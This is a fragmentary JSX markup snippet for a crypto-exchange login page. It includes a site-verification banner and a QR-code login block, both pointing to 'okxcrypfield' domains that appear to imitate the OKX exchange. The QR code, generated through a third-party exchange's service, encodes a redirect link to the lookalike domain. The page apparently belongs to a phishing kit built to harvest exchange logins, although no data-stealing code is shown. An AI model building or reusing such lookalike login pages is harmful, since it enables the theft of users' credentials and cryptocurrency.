    ...
    <div style={{width:"100%", height:"8vh",}}></div>
       ...
       <>
        ...
        <LoginSure>
            ...
            <LoginSureSite>https://okxcrypfield.org</LoginSureSite>
        </LoginSure>
        <LoginText>
       ...
       <QRWrapper >
        <QRCode>
            ...
            <QRCodeWrapper>
                <QRCodeImg src='https://bff.whitebit.com/v1/canvas/qr?url=rdrs.Okxcrypfield .com/app&correctionLevel=H' />
                <QRCodeText>
                    <QRCodeTextHeader>Log in with QR code</QRCodeTextHeader>
                    <QRCodeTextPar>Scan this code with the Okxcrypfield  mobile app to log in</QRCodeTextPar>
                </QRCodeText>
            </QRCodeWrapper>
